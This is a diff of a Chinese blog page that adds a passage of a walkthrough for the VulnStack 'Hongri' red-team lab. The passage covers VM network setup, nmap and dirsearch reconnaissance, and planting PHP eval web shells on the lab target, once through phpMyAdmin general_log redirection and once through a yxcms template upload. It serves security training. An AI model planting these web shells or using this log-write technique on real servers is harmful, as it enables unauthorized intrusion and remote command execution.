@@ -1,13 +1,13 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日靶场一 | Bamboo22 's Blog</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="热爱学习，分享技术">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日靶场一 | Bamboo22 's Blog</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="环境搭建VulnStack 官方链接 vmx文件，会自动打开Vmware，初始的密码都是：hongrisec@2019，登陆时有的机器会提示我密码过期，更改密码即可 网络拓扑图如下：   win7拓扑图我们得知，win7是一个边界服务器，所以是需要有两个网卡的，首先给win7添加一个网卡  编辑虚拟机–>添加–>网络适配器     将网络适配器1设置成自定义Vmnet1(仅主机模式)，">
 <meta property="og:type" content="article">
 <meta property="og:title" content="红日靶场一">
 <meta property="og:url" content="http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/index.html">
 <meta property="og:site_name" content="Bamboo22 's Blog">
-<meta property="og:description" content="热爱学习，分享技术">
+<meta property="og:description" content="环境搭建VulnStack 官方链接 vmx文件，会自动打开Vmware，初始的密码都是：hongrisec@2019，登陆时有的机器会提示我密码过期，更改密码即可 网络拓扑图如下：   win7拓扑图我们得知，win7是一个边界服务器，所以是需要有两个网卡的，首先给win7添加一个网卡  编辑虚拟机–>添加–>网络适配器     将网络适配器1设置成自定义Vmnet1(仅主机模式)，">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://api.bimg.cc/random">
 <meta property="article:published_time" content="2024-01-23T08:50:05.000Z">
-<meta property="article:modified_time" content="2024-01-23T08:50:06.010Z">
+<meta property="article:modified_time" content="2024-01-23T09:22:13.800Z">
 <meta property="article:author" content="Bamboo22">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://api.bimg.cc/random"><link rel="shortcut icon" href="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="canonical" href="http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
@@ -54,8 +54,8 @@
   isPost: true,
   isHome: false,
   isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2024-01-23 16:50:06'
+  isToc: true,
+  postUpdate: '2024-01-23 17:22:13'
 }</script><script>(win=>{
       win.saveToLocal = {
         set: (key, value, ttl) => {
@@ -171,4 +171,354 @@
         }
       }
       detectApple()
-    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.bimg.cc/random')"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场一</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-23T08:50:05.000Z" title="发表于 2024-01-23 16:50:05">2024-01-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-23T08:50:06.010Z" title="更新于 2024-01-23 16:50:06">2024-01-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日靶场一"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://api.bimg.cc/random');"></div><article class="post-content" id="article-container"></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Bamboo22</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bamboo22 's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://api.bimg.cc/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="内网横向移动"><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">内网横向移动</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">热爱学习，分享技术</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到Bamboo的博客！原博客已于2024年1月22日完成迁移，将会持续更新</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/" title="红日靶场一"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场一"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/" title="红日靶场一">红日靶场一</a><time datetime="2024-01-23T08:50:05.000Z" title="发表于 2024-01-23 16:50:05">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="内网横向移动"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网横向移动"></a><div class="content"><a class="title" href="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="内网横向移动">内网横向移动</a><time datetime="2024-01-23T08:30:12.000Z" title="发表于 2024-01-23 16:30:12">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="JWT的攻击方法"><img src="http://pic.bamboo22.top/120.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JWT的攻击方法"></a><div class="content"><a class="title" href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="JWT的攻击方法">JWT的攻击方法</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/JWT/" title="JWT"><img src="http://pic.bamboo22.top/120.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JWT"></a><div class="content"><a class="title" href="/2024/01/22/JWT/" title="JWT">JWT</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="SQL盲注脚本编写"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL盲注脚本编写"></a><div class="content"><a class="title" href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="SQL盲注脚本编写">SQL盲注脚本编写</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.bimg.cc/random')"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场一</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-23T08:50:05.000Z" title="发表于 2024-01-23 16:50:05">2024-01-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-23T09:22:13.800Z" title="更新于 2024-01-23 17:22:13">2024-01-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日靶场一"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://api.bimg.cc/random');"></div><article class="post-content" id="article-container"><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/">VulnStack 官方链接</a></p>
+<p>vmx文件，会自动打开Vmware，初始的密码都是：<strong>hongrisec@2019</strong>，登陆时有的机器会提示我密码过期，更改密码即可</p>
+<p>网络拓扑图如下：</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5ouI6Iqx5YC-5Z-O,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述" style="zoom: 80%;">
+
+<h4 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h4><p>拓扑图我们得知，win7是一个边界服务器，所以是需要有两个网卡的，首先给win7添加一个网卡</p>
+<blockquote>
+<p>编辑虚拟机–&gt;添加–&gt;网络适配器</p>
+</blockquote>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801095557388.png" alt="image-20230801095557388" style="zoom:60%;">
+
+<blockquote>
+<p>将网络适配器1设置成自定义Vmnet1(仅主机模式)，网络适配器2设置成NAT模式</p>
+</blockquote>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801095828596.png" alt="image-20230801095828596" style="zoom:67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801095847645.png" alt="image-20230801095847645" style="zoom:67%;">
+
+<h4 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h4><p>将网络适配器设置为VMnet1（仅主机模式）</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801100227904.png" alt="image-20230801100227904" style="zoom:67%;">
+
+<h4 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h4><p>将网络适配器设置为VMnet1（仅主机模式）</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801100402525.png" alt="image-20230801100402525" style="zoom:67%;">
+
+<p>至此网络配置完成，现在可以登进去每个服务器看一看，是不是成功获取了IP，最终形成的 IP 划分情况如下：</p>
+<table>
+<thead>
+<tr>
+<th>主机</th>
+<th>IP地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>物理机win11</td>
+<td>192.168.95.1(VMnet8的IP)</td>
+</tr>
+<tr>
+<td>win7边界服务器</td>
+<td>外网IP：192.168.85.133；内网IP：192.168.52.143</td>
+</tr>
+<tr>
+<td>win2003</td>
+<td>内网IP：192.168.52.141</td>
+</tr>
+<tr>
+<td>win2008</td>
+<td>内网IP：192.168.52.138</td>
+</tr>
+</tbody></table>
+<p>win11是可以访问外网的，win2003和win2008都不行</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801101637723.png" alt="image-20230801101637723" style="zoom:45%;">
+
+<p>在C盘中找到phpstudy，打开web服务</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801160958535.png" alt="image-20230801160958535" style="zoom:64%;">
+
+<h1 id="01-ATT-CK红队评估一"><a href="#01-ATT-CK红队评估一" class="headerlink" title="01 ATT&amp;CK红队评估一"></a>01 ATT&amp;CK红队评估一</h1><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="探测靶机IP"><a href="#探测靶机IP" class="headerlink" title="探测靶机IP"></a>探测靶机IP</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801112620149.png" alt="image-20230801112620149" style="zoom:60%;">
+
+<h4 id="探测开放端口"><a href="#探测开放端口" class="headerlink" title="探测开放端口"></a>探测开放端口</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -p- 192.168.85.133</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801161529692.png" alt="image-20230801161529692" style="zoom:60%;">
+
+<h4 id="web端信息搜集"><a href="#web端信息搜集" class="headerlink" title="web端信息搜集"></a>web端信息搜集</h4><p>看到开放了80端口和3306端口</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801161655821.png" alt="image-20230801161655821" style="zoom:67%;">
+
+<p>访问80端口，发现是一个phpstudy探针</p>
+<p><strong>dirsearch</strong>扫一下目录</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.85.133 -e * -i 200</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801161938577.png" alt="image-20230801161938577" style="zoom:67%;">
+
+<p>扫出<code>/phpinfo.php</code>和<code>/phpmyAdmin/</code></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="phpmyadmin写🐎"><a href="#phpmyadmin写🐎" class="headerlink" title="phpmyadmin写🐎"></a><strong>phpmyadmin写🐎</strong></h5><p>进如<code>phpmyAdmin</code>，直接初始密码 <strong>root : root</strong> 登陆成功</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801162213460.png" class="" title="image-20230801162213460">
+
+<p>进入之后就想到写🐎，在之前的探针中我们又能看到绝对路径</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801172913746.png" alt="image-20230801172913746" style="zoom:67%;">
+
+<p>于是我们先查一下读写权限是否开启</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> "secure_file_priv"</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801172326904.png" alt="image-20230801172326904" style="zoom: 50%;">
+
+<p>发现为null，就是都没有读写权限，如果要修改只能进入服务器修改<code>MySQL.ini</code>，所以我们只能换一种方法</p>
+<p>写🐎还可以写进日志、慢日志</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables  <span class="keyword">like</span>  <span class="string">'general_log'</span>;   #可以查看日志的读写是否开启</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;           #开启此功能</span><br><span class="line"><span class="keyword">show</span> variables  <span class="keyword">like</span>  <span class="string">'general_log_file'</span>;                           #查看日志的默认路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">'C:\\phpStudy\\WWW\\shell.php'</span>;         #修改路径</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查出来是off，只需要把他改为on就行了</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801172746085.png" alt="image-20230801172746085" style="zoom:60%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801172823331.png" alt="image-20230801172823331" style="zoom:60%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801173747494.png" alt="image-20230801173747494" style="zoom:58%;">
+
+<p>写🐎</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801173456615.png" alt="image-20230801173456615" style="zoom:60%;">
+
+<p>蚁剑连shell.php</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801174601462.png" class="" title="image-20230801174601462">
+
+<h5 id="yxcms文件上传"><a href="#yxcms文件上传" class="headerlink" title="yxcms文件上传"></a><strong>yxcms文件上传</strong></h5><p>这里发现一个<strong>yxcms</strong>和<strong>beifen.rar</strong>,，<strong>beifen.rar</strong>应该就是网站的备份文件，我们先下载下来</p>
+<p>进入<strong>yxms</strong>看看</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801175743888.png" alt="image-20230801175743888" style="zoom:75%;">
+
+<p>发现后台登录密码，成功登入后台</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801175950385.png" alt="image-20230801175950385" style="zoom:58%;">
+
+<p>前台模板–&gt;管理模板文件–&gt;新建，便可上传文件</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801181617004.png" class="" title="image-20230801181617004">
+
+<p>在刚刚下载的备份文件中就能找到路径，用蚁剑就能连上</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801183002240.png" alt="image-20230801183002240" style="zoom:67%;">
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801183127703.png" alt="image-20230801183127703" style="zoom:50%;">
+
